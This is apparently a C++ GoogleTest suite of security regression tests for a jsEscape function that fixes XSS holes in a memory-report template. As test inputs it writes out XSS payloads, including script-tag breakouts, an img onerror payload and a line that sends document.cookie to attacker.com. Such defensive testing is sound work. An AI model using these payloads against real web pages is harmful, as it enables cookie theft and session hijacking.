/*
 * Security regression tests for JS-string escaping (RDKEMW-25864)
 *
 * Validates the security invariant that process names and group names
 * interpolated into JavaScript single-quoted string literals in the
 * report template cannot break out of the string context.
 *
 * Findings addressed:
 * - MemCapture_High_005: XSS via process name in pssChart labels
 * - MemCapture_Medium_001: XSS via group name in pssGroupChart labels
 * - MemCapture_Medium_006: Same sink as H005, independent discovery
 *
 * The vulnerable template code was:
 *   '{{ at(processes, i).name }}'  -- no escaping
 *
 * The fix uses:
 *   '{{ jsEscape(at(processes, i).name) }}'
 */

#include <gtest/gtest.h>
#include <string>

/**
 * @brief Standalone reimplementation of the jsEscape callback from main.cpp.
 * Extracted for testing — mirrors the exact escaping logic.
 */
static std::string jsEscape(const std::string &input)
{
    std::string escaped;
    escaped.reserve(input.size() + input.size() / 4);

    for (char c : input) {
        switch (c) {
            case '\\': escaped += "\\\\"; break;
            case '\'': escaped += "\\'"; break;
            case '"':  escaped += "\\\""; break;
            case '<':  escaped += "\\x3c"; break;
            case '>':  escaped += "\\x3e"; break;
            case '/':  escaped += "\\/"; break;
            case '\n': escaped += "\\n"; break;
            case '\r': escaped += "\\r"; break;
            case '\0': escaped += "\\0"; break;
            default:
                if (static_cast<unsigned char>(c) < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\x%02x", static_cast<unsigned char>(c));
                    escaped += buf;
                } else {
                    escaped += c;
                }
                break;
        }
    }

    return escaped;
}

// --- Core XSS prevention tests ---

// H005: Single-quote breakout must be escaped
TEST(JsEscapeTest, EscapesSingleQuote) {
    std::string malicious = "foo'bar";
    std::string escaped = jsEscape(malicious);
    EXPECT_EQ(escaped, "foo\\'bar");
    // Verify no raw single quote remains
    EXPECT_EQ(escaped.find('\''), std::string::npos);
}

// H005: </script> breakout must be neutralized
TEST(JsEscapeTest, EscapesScriptClose) {
    std::string malicious = "foo</script><script>alert(1)</script>";
    std::string escaped = jsEscape(malicious);
    // < and > and / are all escaped, preventing </script> breakout
    EXPECT_EQ(escaped.find("</script>"), std::string::npos);
    EXPECT_EQ(escaped.find('<'), std::string::npos);
    EXPECT_EQ(escaped.find('>'), std::string::npos);
}

// H005/M006: Full XSS payload in process name
TEST(JsEscapeTest, NeutralizesFullXssPayload) {
    std::string payload = "';alert(document.cookie);//";
    std::string escaped = jsEscape(payload);
    // No raw single quote
    EXPECT_EQ(escaped.find('\''), std::string::npos);
    // Verify round-trip: putting escaped into '...' produces a valid JS string
    std::string jsString = "'" + escaped + "'";
    EXPECT_NE(jsString.find("\\'"), std::string::npos); // escaped quote present
}

// M001: Group name with XSS payload
TEST(JsEscapeTest, NeutralizesGroupNameXss) {
    std::string payload = "Browser</script><img src=x onerror=alert(1)>";
    std::string escaped = jsEscape(payload);
    EXPECT_EQ(escaped.find('<'), std::string::npos);
    EXPECT_EQ(escaped.find('>'), std::string::npos);
    EXPECT_EQ(escaped.find("</script>"), std::string::npos);
}

// --- Backslash handling ---

TEST(JsEscapeTest, EscapesBackslash) {
    EXPECT_EQ(jsEscape("a\\b"), "a\\\\b");
}

TEST(JsEscapeTest, EscapesDoubleQuote) {
    EXPECT_EQ(jsEscape("a\"b"), "a\\\"b");
}

// --- Control character handling ---

TEST(JsEscapeTest, EscapesNewline) {
    EXPECT_EQ(jsEscape("line1\nline2"), "line1\\nline2");
}

TEST(JsEscapeTest, EscapesCarriageReturn) {
    EXPECT_EQ(jsEscape("line1\rline2"), "line1\\rline2");
}

TEST(JsEscapeTest, EscapesControlCharacters) {
    std::string input(1, '\x01');
    EXPECT_EQ(jsEscape(input), "\\x01");

    std::string tab(1, '\t');
    EXPECT_EQ(jsEscape(tab), "\\x09");
}

// --- Forward slash escaping (prevents </script> partial matches) ---

TEST(JsEscapeTest, EscapesForwardSlash) {
    EXPECT_EQ(jsEscape("/usr/bin/process"), "\\/usr\\/bin\\/process");
}

// --- Angle bracket escaping ---

TEST(JsEscapeTest, EscapesAngleBrackets) {
    EXPECT_EQ(jsEscape("<tag>"), "\\x3ctag\\x3e");
}

// --- Normal strings pass through safely ---

TEST(JsEscapeTest, NormalStringUnchanged) {
    EXPECT_EQ(jsEscape("WPEWebProcess"), "WPEWebProcess");
    EXPECT_EQ(jsEscape("com.sky.as.apps"), "com.sky.as.apps");
    EXPECT_EQ(jsEscape("memcapture"), "memcapture");
}

// --- Empty string ---

TEST(JsEscapeTest, EmptyString) {
    EXPECT_EQ(jsEscape(""), "");
}

// --- Combined attack vector ---

TEST(JsEscapeTest, CombinedAttackVector) {
    // A realistic crafted process name combining multiple escape-worthy chars
    std::string attack = "evil'</script><script>fetch('https://attacker.com/steal?c='+document.cookie)</script>";
    std::string escaped = jsEscape(attack);

    // Verify none of the dangerous characters remain raw
    EXPECT_EQ(escaped.find('\''), std::string::npos);
    EXPECT_EQ(escaped.find('<'), std::string::npos);
    EXPECT_EQ(escaped.find('>'), std::string::npos);
    EXPECT_EQ(escaped.find("</script>"), std::string::npos);
}

// --- Long string performance (should not crash or timeout) ---

TEST(JsEscapeTest, HandlesLongString) {
    std::string longStr(10000, 'A');
    std::string escaped = jsEscape(longStr);
    EXPECT_EQ(escaped.size(), 10000u); // no special chars, same length
}
